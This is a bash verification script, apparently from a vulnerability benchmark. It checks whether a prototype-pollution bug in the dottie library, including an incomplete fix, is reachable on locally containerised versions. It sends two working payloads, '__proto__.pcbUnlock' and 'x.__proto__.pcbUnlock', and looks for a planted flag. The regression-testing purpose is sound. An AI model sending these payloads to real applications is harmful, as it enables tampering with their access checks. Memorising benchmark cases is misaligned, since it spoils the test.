#!/usr/bin/env bash
# =====================================================================
# PCBV2-0047 dottie-cve-2026-27837 (CVE-2023-26132 -> CVE-2026-27837)
#   seed     (CVE-2023-26132): GET /probe?path=__proto__.pcbUnlock
#            —— Dottie.set 路径首段 __proto__ 使写入落到 target 的原型上
#            （prototype pollution），default-deny gate 翻转释放 ${PCB_FLAG}
#            （响应 JSON gated_secret==FLAG）。V0(dottie@2.0.3 无 guard) 可达；
#            V1(2.0.4 guard 只查 pieces[0]==='__proto__') 首段即 __proto__ -> set()
#            直接 return -> 阻断。
#   residual (CVE-2026-27837): GET /probe?path=x.__proto__.pcbUnlock
#            —— __proto__ 放在非首段；V1(2.0.4) guard 只查 pieces[0]='x' 通过，
#            遍历到第 2 段 __proto__ 替换 target.x 的原型 -> 写入落到原型 ->
#            gate 翻转释放 FLAG == 不完整修复 -> V1 可达；
#            V2(2.0.7 DANGEROUS_KEYS 任意位置拒绝) 阻断。
#   效果通道 = /probe 响应 JSON（gated_secret 字段 == FLAG 当 polluted=true；
#            否则 "denied"）。
#   判定基准 = RUN_FLAG（提交值）：正常 seed 时 RUN_FLAG=平台真 flag；wrong/stale
#             检查时 RUN_FLAG=提交的 override（通道含真 flag≠override -> 10）。
#   退出码：0=效果发生(flag 出现在响应 body) 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE_FLAG="$RUN_FLAG"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 宿主端口：优先 docker compose port 动态解析，回退固定映射（39701/39702/39703 -> 容器 8080）
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-8080}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=39701;; v1) PORT=39702;; v2) PORT=39703;; *) PORT=39702;;
  esac
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
fi
[[ -n "$PORT" ]] || { echo "ERR: cannot resolve port for $VERSION" >&2; exit 20; }

# 就绪等待：node harness 首页 200
"$PY" - "$PORT" <<'PYEOF'
import sys, time, urllib.request
port = sys.argv[1]
for _ in range(60):
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=5) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: dottie harness $VERSION not ready" >&2; exit 20; }

# 执行 + 判定：urllib GET /probe?path=...（与 poc/seed_exec.py 一致）。
# 有 HTTP 状态码但 body 无 RUN_FLAG -> 10；连接失败 -> 20。
"$PY" - "$PORT" "$JUDGE_FLAG" "$MODE" <<'PYEOF'
import sys, urllib.error, urllib.parse, urllib.request

port, flag, mode = sys.argv[1], sys.argv[2], sys.argv[3]
if mode == "--seed":
    path = "__proto__.pcbUnlock"
else:
    path = "x.__proto__.pcbUnlock"
url = f"http://127.0.0.1:{port}/probe?{urllib.parse.urlencode({'path': path})}"
try:
    with urllib.request.urlopen(url, timeout=20) as r:
        status, body = r.getcode(), r.read().decode("utf-8", "replace")
except urllib.error.HTTPError as e:
    status, body = e.code, e.read().decode("utf-8", "replace")
except Exception as e:
    print(f"[verify {mode}] {path}")
    print(f"[verify] transport error: {e!r}", file=sys.stderr)
    sys.exit(20)
print(f"[verify {mode}] {path}")
print(f"[verify] HTTP {status} body={body[:200]}")
if not status:
    print("[verify] no HTTP status (connection failed)", file=sys.stderr)
    sys.exit(20)
sys.exit(0 if flag in body else 10)
PYEOF
RC=$?
echo "verify[$MODE] version=$VERSION rc=$RC (judge_flag=$JUDGE_FLAG)" >&2
exit "$RC"
